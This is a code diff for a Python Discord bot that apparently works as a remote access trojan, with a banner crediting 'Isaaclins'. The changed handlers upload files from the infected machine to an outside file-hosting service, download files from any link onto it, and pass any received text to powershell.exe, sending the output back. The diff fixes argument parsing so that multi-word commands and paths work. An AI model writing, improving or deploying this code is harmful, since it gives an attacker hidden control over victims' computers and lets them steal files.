@@ -33,7 +33,7 @@ Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888
  "Y8888P"  888  "Y88888  "Y888 888  888  "Y8888  888      "Y8888P"   "Y88P"  888     "Y88888 
                     888                                                                      
                Y8b d88P                                                                      
-                "Y88P"         -Isaaclins
+                "Y88P"  -Made by Isaaclins
 
     Usage:
     .help               - Shows this message
@@ -134,7 +134,7 @@ async def on_message(message):
                 await message.reply(embed=embed)
 
             if message.content.startswith("cd") or message.content.startswith("Cd"):
-                directory = message.content.split(" ")[1]
+                directory = message.content[3:]
                 try:
                     os.chdir(directory)
                     files = "\n".join(os.listdir())
@@ -153,7 +153,7 @@ async def on_message(message):
                 await message.reply(embed=embed)
 
             if message.content.startswith("download") or message.content.startswith("Download"):
-                file = message.content.split(" ")[1]
+                file = message.content[9:]
                 try:
                     link = requests.post("https://api.letsupload.cc/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                     embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
@@ -163,7 +163,7 @@ async def on_message(message):
                     await message.reply(embed=embed)
 
             if message.content.startswith("upload") or message.content.startswith("Upload"):
-                link = message.content.split(" ")[1]
+                link = message.content[7:]
                 file = requests.get(link).content
                 with open(os.path.basename(link), "wb") as f:
                     f.write(file)
@@ -171,7 +171,7 @@ async def on_message(message):
                 await message.reply(embed=embed)
 
             if message.content.startswith("shell") or message.content.startswith("Shell"):
-                command = message.content.split(" ")[1]
+                command = message.content[6:]
                 output = subprocess.Popen(
                     ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                 ).communicate()[0].decode("utf-8")
